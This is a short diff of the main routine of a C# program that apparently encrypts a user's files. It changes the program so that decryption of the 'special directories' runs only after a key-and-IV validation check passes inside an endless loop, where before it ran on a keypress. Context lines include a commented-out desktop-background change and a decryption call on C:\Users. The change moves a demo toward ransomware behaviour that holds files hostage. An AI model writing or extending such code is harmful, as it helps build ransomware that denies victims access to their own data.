@@ -22,13 +22,20 @@
             //Utils.SetDesktopBackground(@"C:\Users\Programming\Desktop\Background.jpg");
 
             // Starts decryption prcoess after key press
-            Console.WriteLine("Press any key to decrypt files");
-            Console.ReadKey();
-            Decryptor decryptor = new Decryptor(encryptor.key, encryptor.iv);
-            decryptor.DecryptSpecialDirectories();
+            while (true)
+            {
+                if (Utils.ValidateKeyAndIv(encryptor.key, encryptor.iv))
+                {
+                    Decryptor decryptor = new Decryptor(encryptor.key, encryptor.iv);
+                    decryptor.DecryptSpecialDirectories();
+                    Console.ReadKey();
+                    Environment.Exit(0);
+                }
+            }
+
 
             // decryptor.DecryptDirectory(@"C:\Users");
-            Console.ReadKey();
+
         }
     }
 }
